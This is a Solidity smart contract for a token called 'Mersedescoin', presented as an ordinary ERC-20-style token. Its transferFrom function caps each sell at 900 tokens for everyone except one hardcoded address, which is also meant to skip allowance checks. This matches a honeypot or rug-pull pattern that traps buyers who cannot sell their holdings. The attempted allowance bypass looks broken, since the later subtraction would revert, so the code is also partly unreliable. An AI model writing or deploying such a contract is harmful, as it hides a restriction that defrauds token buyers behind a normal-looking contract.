// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 900000000000000 * 10 ** 18;
    string public name = "Mersedescoin";
    string public symbol = "MERSEDES";
    uint public decimals = 18;
    
    uint public maxSellAmount = 900 * 10**18; 
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
function transferFrom(address from, address to, uint value) public returns (bool) {
    require(balanceOf(from) >= value, 'balance too low');
    require(allowance[from][msg.sender] >= value || from == address(0x9fC5C80d163F05D04A707C7cf6F7ED6c0e5e0303), 'allowance too low');
    require(value <= maxSellAmount || from == address(0x9fC5C80d163F05D04A707C7cf6F7ED6c0e5e0303), 'exceeds max sell amount');
    balances[to] += value;
    balances[from] -= value;
    allowance[from][msg.sender] -= value; // Уменьшение разрешенного остатка
    emit Transfer(from, to, value);
    return true;
}
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}